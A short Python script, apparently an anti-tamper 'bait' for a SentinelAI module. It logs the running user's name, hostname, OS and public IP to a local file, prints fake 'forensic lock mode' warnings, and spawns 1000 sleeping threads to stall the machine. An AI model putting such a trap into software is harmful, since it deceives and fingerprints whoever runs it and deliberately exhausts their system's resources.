
import os
import platform
import socket
import threading
import time
import getpass
import requests

def system_stall():
    print("[!] SentinelAI Core Module Detected Tampering...")
    print("[x] Entering forensic lock mode. Do not interrupt.")
    for _ in range(1000):
        threading.Thread(target=lambda: time.sleep(120)).start()
    time.sleep(2)

def capture_identity():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = "Offline/Unknown"
    user = getpass.getuser()
    pc = platform.node()
    os_name = platform.system() + " " + platform.release()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log = f"[RE Detected] {timestamp}\nUser: {user}\nPC: {pc}\nOS: {os_name}\nIP: {ip}\n---\n"
    with open("rev_attacker_log.txt", "a") as f:
        f.write(log)

def bait():
    capture_identity()
    system_stall()

if __name__ == "__main__":
    bait()
